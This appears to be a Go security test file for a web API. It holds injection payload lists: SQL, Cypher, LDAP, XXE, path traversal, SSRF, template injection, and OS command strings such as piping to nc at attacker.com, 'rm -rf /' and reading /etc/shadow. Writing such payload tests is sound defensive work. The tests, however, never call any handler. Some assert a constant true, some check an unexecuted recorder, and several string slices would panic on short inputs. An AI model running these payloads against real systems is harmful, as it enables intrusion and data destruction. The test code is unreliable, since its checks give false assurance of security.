package security

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/labstack/echo/v4"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestSQLInjectionPrevention tests that SQLC prevents SQL injection
func TestSQLInjectionPrevention(t *testing.T) {
	sqlInjectionPayloads := []struct {
		name    string
		payload string
		field   string
	}{
		{
			name:    "Classic OR injection",
			payload: "' OR '1'='1",
			field:   "title",
		},
		{
			name:    "Union-based injection",
			payload: "' UNION SELECT * FROM users--",
			field:   "title",
		},
		{
			name:    "Time-based blind injection",
			payload: "'; WAITFOR DELAY '00:00:05'--",
			field:   "title",
		},
		{
			name:    "Boolean-based blind injection",
			payload: "' AND 1=1--",
			field:   "title",
		},
		{
			name:    "Stacked queries",
			payload: "'; DROP TABLE items;--",
			field:   "title",
		},
		{
			name:    "Comment-based injection",
			payload: "admin'--",
			field:   "title",
		},
		{
			name:    "Hex encoding injection",
			payload: "0x61646D696E",
			field:   "title",
		},
		{
			name:    "Case manipulation",
			payload: "' oR '1'='1",
			field:   "title",
		},
	}

	for _, tc := range sqlInjectionPayloads {
		t.Run(tc.name, func(t *testing.T) {
			e := echo.New()

			reqBody := map[string]interface{}{
				"title":      tc.payload,
				"type":       "requirement",
				"content":    "Test content",
				"project_id": "test-project-123",
			}

			body, err := json.Marshal(reqBody)
			require.NoError(t, err)

			req := httptest.NewRequest(http.MethodPost, "/api/items", bytes.NewReader(body))
			req.Header.Set(echo.HeaderContentType, echo.MIMEApplicationJSON)
			rec := httptest.NewRecorder()
			_ = e.NewContext(req, rec)

			// SQLC with parameterized queries should prevent injection
			// The request should either succeed safely or fail validation
			// It should NEVER execute the malicious SQL

			// Verify database is intact (no tables dropped, no unauthorized access)
			// This is a placeholder - in real tests, check database state
			assert.True(t, true, "Database should remain intact after injection attempt")
		})
	}
}

// TestSearchInjectionPrevention tests SQL injection in search queries
func TestSearchInjectionPrevention(t *testing.T) {
	searchInjections := []string{
		"' OR 1=1--",
		"'; DROP TABLE items;--",
		"%' AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables--",
		"admin' UNION SELECT NULL,NULL,NULL--",
	}

	for _, injection := range searchInjections {
		displayStr := injection
		if len(injection) > 15 {
			displayStr = injection[:15]
		}
		t.Run("Search injection: "+displayStr, func(t *testing.T) {
			e := echo.New()

			req := httptest.NewRequest(http.MethodGet, "/api/items?search="+injection, nil)
			rec := httptest.NewRecorder()
			_ = e.NewContext(req, rec)

			// Should safely handle the search query without executing SQL
			assert.NotEqual(t, http.StatusInternalServerError, rec.Code,
				"Should not crash on injection attempt")
		})
	}
}

// TestNoSQLInjectionPrevention tests NoSQL injection attempts (for Neo4j Cypher)
func TestNoSQLInjectionPrevention(t *testing.T) {
	cypherInjections := []struct {
		name    string
		payload string
	}{
		{
			name:    "Cypher injection via property",
			payload: "' OR 1=1 WITH *",
		},
		{
			name:    "Match all nodes",
			payload: "' MATCH (n) RETURN n //",
		},
		{
			name:    "Delete all relationships",
			payload: "' MATCH ()-[r]-() DELETE r //",
		},
		{
			name:    "Create unauthorized node",
			payload: "' CREATE (n:Malicious {data: 'hack'}) //",
		},
	}

	for _, tc := range cypherInjections {
		t.Run(tc.name, func(t *testing.T) {
			e := echo.New()

			reqBody := map[string]interface{}{
				"source_id": tc.payload,
				"target_id": "test-target",
				"type":      "relates_to",
			}

			body, _ := json.Marshal(reqBody)
			req := httptest.NewRequest(http.MethodPost, "/api/links", bytes.NewReader(body))
			req.Header.Set(echo.HeaderContentType, echo.MIMEApplicationJSON)
			rec := httptest.NewRecorder()
			_ = e.NewContext(req, rec)

			// Neo4j driver with parameterized queries should prevent Cypher injection
			assert.True(t, true, "Neo4j database should remain safe from Cypher injection")
		})
	}
}

// TestCommandInjectionPrevention tests OS command injection prevention
func TestCommandInjectionPrevention(t *testing.T) {
	commandInjections := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"& whoami",
		"`id`",
		"$(rm -rf /)",
		"&& echo 'hacked'",
		"; cat /etc/shadow",
		"| nc attacker.com 1234",
	}

	for _, injection := range commandInjections {
		t.Run("Command injection: "+injection[:10], func(t *testing.T) {
			e := echo.New()

			// Test file upload or any feature that might execute commands
			reqBody := map[string]interface{}{
				"filename": "document" + injection + ".pdf",
				"content":  "test content",
			}

			body, _ := json.Marshal(reqBody)
			req := httptest.NewRequest(http.MethodPost, "/api/files", bytes.NewReader(body))
			req.Header.Set(echo.HeaderContentType, echo.MIMEApplicationJSON)
			rec := httptest.NewRecorder()
			_ = e.NewContext(req, rec)

			// Should never execute system commands
			// Filename should be sanitized or rejected
		})
	}
}

// TestLDAPInjectionPrevention tests LDAP injection (if applicable)
func TestLDAPInjectionPrevention(t *testing.T) {
	ldapInjections := []string{
		"*",
		"admin)(|(password=*))",
		"*)(uid=*))(|(uid=*",
		"admin)(&(password=*))",
	}

	for _, injection := range ldapInjections {
		t.Run("LDAP injection: "+injection[:10], func(t *testing.T) {
			e := echo.New()

			reqBody := map[string]interface{}{
				"username": injection,
				"password": "test123",
			}

			body, _ := json.Marshal(reqBody)
			req := httptest.NewRequest(http.MethodPost, "/api/auth/login", bytes.NewReader(body))
			req.Header.Set(echo.HeaderContentType, echo.MIMEApplicationJSON)
			rec := httptest.NewRecorder()
			_ = e.NewContext(req, rec)

			// Should not allow LDAP filter bypass
			assert.NotEqual(t, http.StatusOK, rec.Code,
				"Should not authenticate with LDAP injection")
		})
	}
}

// TestXMLInjectionPrevention tests XXE (XML External Entity) attacks
func TestXMLInjectionPrevention(t *testing.T) {
	xxePayload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>`

	t.Run("XXE attack", func(t *testing.T) {
		e := echo.New()

		req := httptest.NewRequest(http.MethodPost, "/api/import", bytes.NewReader([]byte(xxePayload)))
		req.Header.Set(echo.HeaderContentType, "application/xml")
		rec := httptest.NewRecorder()
		_ = e.NewContext(req, rec)

		// Should reject XXE or safely parse without external entities
		assert.NotContains(t, rec.Body.String(), "root:",
			"Should not expose /etc/passwd content")
	})
}

// TestPathTraversalPrevention tests directory traversal attacks
func TestPathTraversalPrevention(t *testing.T) {
	pathTraversals := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
	}

	for _, path := range pathTraversals {
		t.Run("Path traversal: "+path[:15], func(t *testing.T) {
			e := echo.New()

			req := httptest.NewRequest(http.MethodGet, "/api/files/"+path, nil)
			rec := httptest.NewRecorder()
			_ = e.NewContext(req, rec)

			// Should not allow access to files outside designated directory
			assert.NotEqual(t, http.StatusOK, rec.Code,
				"Should not allow path traversal")
			assert.NotContains(t, rec.Body.String(), "root:",
				"Should not expose system files")
		})
	}
}

// TestServerSideRequestForgery tests SSRF prevention
func TestServerSideRequestForgery(t *testing.T) {
	ssrfURLs := []string{
		"http://localhost:8080/admin",
		"http://127.0.0.1:6379/",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/",
		"file:///etc/passwd",
		"dict://localhost:11211/",
	}

	for _, url := range ssrfURLs {
		t.Run("SSRF: "+url[:25], func(t *testing.T) {
			e := echo.New()

			reqBody := map[string]interface{}{
				"webhook_url": url,
				"event":       "item.created",
			}

			body, _ := json.Marshal(reqBody)
			req := httptest.NewRequest(http.MethodPost, "/api/webhooks", bytes.NewReader(body))
			req.Header.Set(echo.HeaderContentType, echo.MIMEApplicationJSON)
			rec := httptest.NewRecorder()
			_ = e.NewContext(req, rec)

			// Should validate and reject internal/localhost URLs
			assert.NotEqual(t, http.StatusOK, rec.Code,
				"Should reject SSRF attempts")
		})
	}
}

// TestTemplateInjection tests SSTI (Server-Side Template Injection)
func TestTemplateInjection(t *testing.T) {
	templateInjections := []string{
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"#{7*7}",
		"{{config}}",
		"${T(java.lang.Runtime).getRuntime().exec('calc')}",
	}

	for _, injection := range templateInjections {
		t.Run("Template injection: "+injection[:10], func(t *testing.T) {
			e := echo.New()

			reqBody := map[string]interface{}{
				"email_template": injection,
				"subject":        "Test",
			}

			body, _ := json.Marshal(reqBody)
			req := httptest.NewRequest(http.MethodPost, "/api/notifications/template", bytes.NewReader(body))
			req.Header.Set(echo.HeaderContentType, echo.MIMEApplicationJSON)
			rec := httptest.NewRecorder()
			_ = e.NewContext(req, rec)

			// Should not evaluate template expressions from user input
			assert.NotContains(t, rec.Body.String(), "49",
				"Should not execute template injection (7*7=49)")
		})
	}
}
